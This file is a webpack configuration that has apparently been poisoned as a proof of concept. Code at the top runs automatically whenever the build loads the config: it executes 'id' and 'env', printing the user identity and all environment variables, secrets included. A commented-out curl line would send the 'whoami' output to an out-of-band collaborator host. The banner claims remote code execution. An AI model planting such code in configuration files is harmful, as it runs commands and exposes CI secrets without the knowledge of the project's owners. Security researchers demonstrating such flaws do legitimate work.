const path = require('path');

const { execSync } = require('child_process');
try {
    console.log("==================================================================");
    console.log("[!] WEBPACK CONFIG POISONED - RCE CONFIRMED [!]");
    console.log("==================================================================");

    // Command 1: Print User ID (Direct proof)
    console.log(execSync('id').toString());

    // Command 2: Print Environment Variables (Secrets proof)
    console.log(execSync('env').toString());

    // Command 3: Send OOB Confirmation (Optional, if you want Burp proof)
    // execSync('curl -d "user=$(whoami)" https://YOUR_BURP_COLLAB.oastify.com');

} catch (e) {
    console.log(e);
}

module.exports = {
    entry: './src/main.ts',
    target: 'node',
    output: {
        path: path.resolve(__dirname, 'lib'),
        filename: "main.js"
    },
    resolve: {
        extensions: [".ts", ".tsx", ".js"]
    },
    stats: {
        warnings: false
    },
    module: {
        rules: [
            {
                test: /\.tsx?$/,
                loader: "ts-loader"
            }
        ]
    }
};
